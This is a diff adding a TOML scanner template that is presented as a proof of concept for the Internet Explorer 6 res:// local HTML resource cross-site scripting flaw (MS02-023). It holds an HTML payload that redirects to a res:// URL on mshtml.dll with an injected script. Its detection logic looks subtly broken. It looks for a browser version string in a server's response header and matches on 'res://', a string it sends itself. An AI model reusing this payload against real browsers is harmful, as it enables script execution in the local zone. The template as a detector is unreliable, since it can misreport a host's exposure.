@@ -1,0 +1,45 @@
+[info]
+author = "AVE"
+description = "检测 Microsoft Internet Explorer 6.0 本地 HTML 资源文件跨站脚本漏洞（MS02-023），通过构造 res:// 协议 URL 加载系统本地 HTML 资源文件并注入脚本，绕过同源策略在本地计算机区域执行任意代码"
+id = "POC-AVE-2002-0203"
+name = "Microsoft Internet Explorer Local HTML Resource XSS PoC"
+severity = "high"
+tags = [
+    "cve-2002-0189",
+    "xss",
+    "ie",
+    "ms02-023",
+]
+vuln_id = [
+    "CVE-2002-0189",
+    "AVE-2002-0203",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "header"
+type = "word"
+words = ["MSIE 6.0"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/exploit.html"
+protocol = "http"
+
+[poc.requests.body]
+content = '''<html><body><script>window.location='res://C:\Windows\System32\mshtml.dll/#<script>alert(document.domain)<\/script>';</script></body></html>'''
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["res://"]
